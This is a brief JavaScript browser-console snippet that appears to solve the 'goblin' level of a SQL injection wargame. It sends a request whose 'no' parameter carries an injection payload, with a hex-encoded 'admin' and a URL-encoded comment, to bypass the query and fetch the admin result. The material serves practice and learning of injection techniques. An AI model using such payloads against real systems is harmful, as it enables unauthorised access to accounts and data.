// On the chrome console window
fetch('https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or id = 0x61646d696e %23', {
        include: 'credentials'
    }
).then((x) => x.text()).then((x) => console.log(x));
